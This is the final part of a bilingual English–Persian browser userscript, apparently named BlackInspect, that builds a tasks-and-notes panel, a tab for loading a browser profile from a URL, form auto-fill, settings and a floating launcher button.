                    W2.querySelectorAll('[data-fdue]').forEach(b=>b.addEventListener('click',()=>{tnFilter.due=tnFilter.due===b.dataset.fdue?'':b.dataset.fdue;re();}));
                    W2.querySelectorAll('[data-fpri]').forEach(b=>b.addEventListener('click',()=>{tnFilter.pri=tnFilter.pri===b.dataset.fpri?'':b.dataset.fpri;re();}));
                    g('tn-clf')&&g('tn-clf').addEventListener('click',()=>{tnFilter={due:'',pri:''};re();});
                    // delete all
                    g('tn-del-all')&&g('tn-del-all').addEventListener('click',()=>{if(confirm(_('Delete all tasks')+'?')){tnTasks=[];saveTnTasks();re();}});
                    g('tn-del-all-n')&&g('tn-del-all-n').addEventListener('click',()=>{if(confirm(_('Delete all notes')+'?')){tnNotes=[];saveTnNotes();re();}});
                    // expanded add
                    g('tn-xp-sub')&&g('tn-xp-sub').addEventListener('click',()=>{const ta=g('tn-xp-ta'),txt=(ta?.value||'').trim();if(!txt)return;const pri=g('tn-xp-pri')?.value||'';const dv=g('tn-xp-due')?.value;tnTasks.push({id:tnuid(),title:txt,done:false,pri,due:dv?new Date(dv).getTime():null,labels:[],created:Date.now()});saveTnTasks();tnAdding=false;re();});
                    // task toggle/delete
                    W2.querySelectorAll('[data-tntg]').forEach(b=>b.addEventListener('click',()=>{const t=tnTasks.find(x=>x.id===b.dataset.tntg);if(t){t.done=!t.done;saveTnTasks();re();}}));
                    W2.querySelectorAll('[data-tntd]').forEach(b=>b.addEventListener('click',e=>{e.stopPropagation();tnTasks=tnTasks.filter(t=>t.id!==b.dataset.tntd);saveTnTasks();re();}));
                    W2.querySelectorAll('[data-tnnd]').forEach(b=>b.addEventListener('click',e=>{e.stopPropagation();tnNotes=tnNotes.filter(n=>n.id!==b.dataset.tnnd);saveTnNotes();re();}));
                    // quick add task
                    const qi=g('tn-qi'),addBtn=g('tn-add-t');
                    addBtn&&addBtn.addEventListener('click',()=>{const txt=(qi?.value||'').trim();if(!txt){tnAdding=true;re();setTimeout(()=>content.querySelector('#tn-xp-ta')?.focus(),50);return;}tnTasks.push({id:tnuid(),title:txt,done:false,pri:'',due:null,labels:[],created:Date.now()});saveTnTasks();if(qi)qi.value='';re();});
                    qi&&qi.addEventListener('keydown',e=>{if(e.key==='Enter')addBtn?.click();});
                    // quick add note
                    const ni=g('tn-ni'),noteBtn=g('tn-add-n');
                    noteBtn&&noteBtn.addEventListener('click',()=>{const txt=(ni?.value||'').trim();if(!txt)return;tnNotes.push({id:tnuid(),title:txt,body:'',created:Date.now()});saveTnNotes();if(ni)ni.value='';re();});
                    ni&&ni.addEventListener('keydown',e=>{if(e.key==='Enter')noteBtn?.click();});
                    // suggestions
                    W2.querySelectorAll('[data-tnqi]').forEach(li=>li.addEventListener('click',()=>{
                        const inp=g('tn-qi');if(!inp)return;
                        const m={'daily-tasks':_('Daily tasks'),'shopping-list':_('Shopping list'),'payment-reminder':_('Payment reminder')};
                        inp.value=m[li.dataset.tnqi]||li.dataset.tnqi; inp.focus();
                    }));
                    W2.querySelectorAll('[data-tnni]').forEach(li=>li.addEventListener('click',()=>{
                        const inp=g('tn-ni');if(!inp)return;
                        const m={'daily-journal':_('Daily journal'),'monthly-plan':_('Monthly plan'),'goals-list':_('Goals list')};
                        inp.value=m[li.dataset.tnni]||li.dataset.tnni; inp.focus();
                    }));
                }

                tnTab=GM_getValue('bi_tn_tab','tasks');
                tnRender();
            }

            // ---- Sync ----
            else if (tab === 'Sync') {
                content.innerHTML = `<h4>☁️ ${_('Load Profile from URL')}</h4>
                <input id="syncUrl" placeholder="https://example.com/profile.json" style="margin-bottom:6px;">
                <button id="syncLoad" style="width:100%;background:#0e639c;color:#fff;">⬇ ${_('Load & Apply')}</button>
                <div id="syncStatus" style="font-size:11px;color:#6a9955;margin-top:4px;"></div>`;
                D.getElementById('syncLoad').onclick = async () => {
                    const url=D.getElementById('syncUrl').value.trim();
                    if(!url){D.getElementById('syncStatus').textContent='⚠ '+_('URL required.');return;}
                    try { const r=await fetch(url); if(!r.ok)throw new Error('HTTP '+r.status); const d=await r.json(); S.ip=d.ip||'';S.ua=d.ua||'';S.platform=d.platform||'';S.language=d.language||'';S.breakOnStart=!!d.breakOnStart; D.getElementById('syncStatus').textContent='✅ '+_('Profile loaded from URL.'); if(S.breakOnStart)breakRestrictions(); } catch(e){D.getElementById('syncStatus').textContent='❌ '+e.message;}
                };
            }

            // ---- Safe ----
            else if (tab === 'Safe') {
                content.innerHTML = `<h4>🛡 ${_('Safe Mode')}</h4><div class="bi-sec" style="color:#888;">${_('Safe Mode features are not yet implemented.')}</div>`;
            }

            // ---- Settings ----
            else if (tab === 'Settings') {
                content.innerHTML = `
                <h4>⚙ ${_('Settings')}</h4>
                <div class="bi-sec">
                    <h4>🌐 ${_('Language / زبان')}</h4>
                    <select id="langSelect" style="margin-bottom:6px;">
                        <option value="en" ${S.lang==='en'?'selected':''}>English</option>
                        <option value="fa" ${S.lang==='fa'?'selected':''}>فارسی</option>
                    </select>
                    <button id="applyLang" style="width:100%;background:#0e639c;color:#fff;">${_('Apply')}</button>
                </div>
                <div class="bi-sec">
                    <h4>🎨 UI</h4>
                    <label>🔆 ${_('Panel Opacity:')} <span id="opacityVal">${Math.round(S.panelOpacity*100)}%</span></label>
                    <input type="range" id="opacitySlider" min="0.2" max="1" step="0.05" value="${S.panelOpacity}" style="width:100%;accent-color:#007acc;margin-bottom:8px;">
                    <label>📐 اندازه فونت: <span id="fontSizeVal">${GM_getValue('bi_font_size','13')}</span>px</label>
                    <input type="range" id="fontSizeSlider" min="10" max="24" step="1" value="${GM_getValue('bi_font_size','13')}" style="width:100%;accent-color:#007acc;margin-bottom:8px;">
                    <div style="margin-top:4px;"><label><input type="checkbox" id="vazirToggle" ${S.useVazir?'checked':''}> ${_('Vazir Font (Persian)')}</label></div>
                    <div style="margin-top:6px;"><label><input type="checkbox" id="ctxMenuToggle" ${S.customRightClick?'checked':''}> ${_('Custom Right-Click Menu')}</label></div>
                    <div style="margin-top:6px;font-size:10px;color:#666;">⌨ Ctrl+G: باز/بسته پنل &nbsp;|&nbsp; Ctrl+Z: ریست پوزیشن</div>
                </div>
                <div class="bi-sec">
                    <h4>👤 ${_('Form Auto-Fill Profile')}</h4>
                    <label>${_('Full Name:')}</label><input id="pfName" value="${S.fillProfile.name||''}" style="margin-bottom:4px;">
                    <label>${_('Email:')}</label><input id="pfEmail" value="${S.fillProfile.email||''}" style="margin-bottom:4px;">
                    <label>${_('Phone:')}</label><input id="pfPhone" value="${S.fillProfile.phone||''}" style="margin-bottom:4px;">
                    <label>${_('Address:')}</label><input id="pfAddr" value="${S.fillProfile.address||''}" style="margin-bottom:4px;">
                    <label>${_('Birthday:')}</label><input id="pfBirth" value="${S.fillProfile.birthday||''}" style="margin-bottom:6px;">
                    <div class="bi-row">
                        <button id="saveProfile" style="flex:1;background:#0e639c;color:#fff;">💾 ${_('Save Profile')}</button>
                        <button id="fillForms" style="flex:1;background:#c5862c;color:#fff;">⚡ ${_('Fill Page Forms')}</button>
                    </div>
                    <div id="profileStatus" style="font-size:11px;color:#6a9955;margin-top:4px;"></div>
                </div>
                <div class="bi-sec">
                    <h4>🐍 ${_('Python Kernel URL')}</h4>
                    <input id="kernelUrlInput" value="${S.kernelUrl}" style="margin-bottom:4px;">
                    <div class="bi-row">
                        <button id="saveKernelUrl" style="flex:1;background:#4d4d4d;color:#fff;">${_('Save')}</button>
                        <button id="testKernel" style="flex:1;background:#4d4d4d;color:#fff;">${_('Test Kernel')}</button>
                    </div>
                    <div id="kernelStatus" style="font-size:11px;color:#6a9955;margin-top:4px;"></div>
                </div>
                <div class="bi-sec">
                    <h4>📁 Files</h4>
                    <label>${_('Default Password Filename')}</label>
                    <input id="passFile" value="${S.passFile}" style="margin-bottom:4px;">
                    <button id="savePassFile" style="width:100%;background:#4d4d4d;color:#fff;margin-bottom:8px;">${_('Save')}</button>
                    <label>${_('Default Profile Filename')}</label>
                    <input id="profileFileIn" value="${S.profileFile}" style="margin-bottom:4px;">
                    <button id="saveProfileFile" style="width:100%;background:#4d4d4d;color:#fff;margin-bottom:8px;">${_('Save')}</button>
                    <button id="pickSaveFolder" style="width:100%;background:#4d4d4d;color:#fff;">📁 ${_('Pick save folder')}</button>
                    <div id="folderStatus" style="font-size:11px;color:#6a9955;margin-top:4px;"></div>
                </div>
                <div class="bi-sec">
                    <button id="resetPanelBtn" style="width:100%;background:#4d4d4d;color:#fff;">${_('Reset Panel Position (Ctrl+Z)')}</button>
                </div>`;

                D.getElementById('applyLang').onclick = () => { S.lang=D.getElementById('langSelect').value; refreshPanel(); };
                // Auto-save opacity
                D.getElementById('opacitySlider').addEventListener('input', function() {
                    const v=parseFloat(this.value); S.panelOpacity=v;
                    D.getElementById('opacityVal').textContent=Math.round(v*100)+'%';
                    if(panel) panel.style.opacity=v;
                });
                // Font size auto-save
                D.getElementById('fontSizeSlider').addEventListener('input', function() {
                    const v=parseInt(this.value); GM_setValue('bi_font_size',String(v));
                    D.getElementById('fontSizeVal').textContent=v;
                    if(panel) panel.style.fontSize=v+'px';
                });
                D.getElementById('vazirToggle').onchange = function() { S.useVazir=this.checked; if(this.checked)applyVazirFont(); else{const el=D.getElementById('bi-vazir-font');if(el)el.remove();const sel=D.getElementById('bi-vazir-style');if(sel)sel.remove();} };
                D.getElementById('ctxMenuToggle').onchange = function() { S.customRightClick=this.checked; };
                D.getElementById('saveProfile').onclick = () => { S.fillProfile={name:D.getElementById('pfName').value,email:D.getElementById('pfEmail').value,phone:D.getElementById('pfPhone').value,address:D.getElementById('pfAddr').value,birthday:D.getElementById('pfBirth').value}; D.getElementById('profileStatus').textContent='✅ '+_('Profile saved.'); };
                D.getElementById('fillForms').onclick = () => {
                    const p=S.fillProfile; let c=0;
                    const fillAttr=(attr,val)=>{D.querySelectorAll('input:not([type=hidden]),textarea').forEach(inp=>{const n=(inp.name+' '+inp.id+' '+inp.placeholder).toLowerCase();if(n.includes(attr)){inp.value=val;inp.dispatchEvent(new Event('input',{bubbles:true}));c++;}});};
                    if(p.name)fillAttr('name',p.name);
                    if(p.email){fillAttr('email',p.email);fillAttr('mail',p.email);}
                    if(p.phone){fillAttr('phone',p.phone);fillAttr('mobile',p.phone);fillAttr('tel',p.phone);}
                    if(p.address)fillAttr('address',p.address);
                    if(p.birthday){fillAttr('birth',p.birthday);fillAttr('dob',p.birthday);}
                    D.getElementById('profileStatus').textContent=`✅ ${c} ${_('fields filled.')}`;
                };
                D.getElementById('kernelUrlInput').addEventListener('input', function(){ S.kernelUrl=this.value.trim(); });
                D.getElementById('saveKernelUrl').onclick = () => {
                    S.kernelUrl=D.getElementById('kernelUrlInput').value.trim();
                    const ks=D.getElementById('kernelStatus'); if(ks){ks.dataset.manual='1';ks.textContent='✅ Saved — checking...';setTimeout(()=>{delete ks.dataset.manual;},4000);}
                    _checkKernel();
                };
                D.getElementById('testKernel').onclick = async () => {
                    const ks=D.getElementById('kernelStatus'); if(ks){ks.dataset.manual='1';ks.textContent='⏳ Testing...';}
                    await _checkKernel();
                    if(ks){ks.dataset.manual='1';ks.textContent=_kernelOnline?'🟢 Online — '+S.kernelUrl:'🔴 Offline';setTimeout(()=>{delete ks.dataset.manual;},5000);}
                };
                D.getElementById('savePassFile').onclick = () => S.passFile=D.getElementById('passFile').value;
                D.getElementById('saveProfileFile').onclick = () => S.profileFile=D.getElementById('profileFileIn').value;
                D.getElementById('pickSaveFolder').onclick = async () => { if(!window.showDirectoryPicker){alert('Not supported in this browser.');return;} try{saveDirectoryHandle=await window.showDirectoryPicker();D.getElementById('folderStatus').textContent='✅ '+_('Folder selected. Files will be saved there.');}catch(e){D.getElementById('folderStatus').textContent='❌ '+e.message;} };
                D.getElementById('resetPanelBtn').onclick = resetPanelPosition;
            }
        }

        showTab(S.activeTab);
        updateBreakButton();
    }

    // ==================== Launcher ====================
    function _biInitLauncher() {
        if (!D.body) return;
        // Avoid double-init
        if (D.getElementById('bi-launcher')) return;
        const launcher = D.createElement('div');
        launcher.id = 'bi-launcher';
        launcher.style.cssText = 'position:fixed;bottom:20px;right:20px;z-index:2147483647;background:#005a9e;color:#fff;width:40px;height:40px;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;font-size:20px;box-shadow:0 4px 16px rgba(0,0,0,.5);direction:ltr;transition:background .2s;user-select:none;';
        launcher.textContent = '⚙';
        launcher.title = 'BlackInspect v7.1 — Ctrl+G: باز/بسته';
        launcher.onmouseenter = () => launcher.style.background = '#004080';
        launcher.onmouseleave = () => launcher.style.background = '#005a9e';
        launcher.addEventListener('click', () => {
            if (!panel) createPanel();
            else panel.style.display = panel.style.display === 'none' ? 'flex' : 'none';
        });
        D.body.appendChild(launcher);
    }
    // Run when body is ready
    if (D.body) {
        _biInitLauncher();
    } else if (D.readyState === 'loading') {
        D.addEventListener('DOMContentLoaded', _biInitLauncher);
    } else {
        _biInitLauncher();
    }

})();
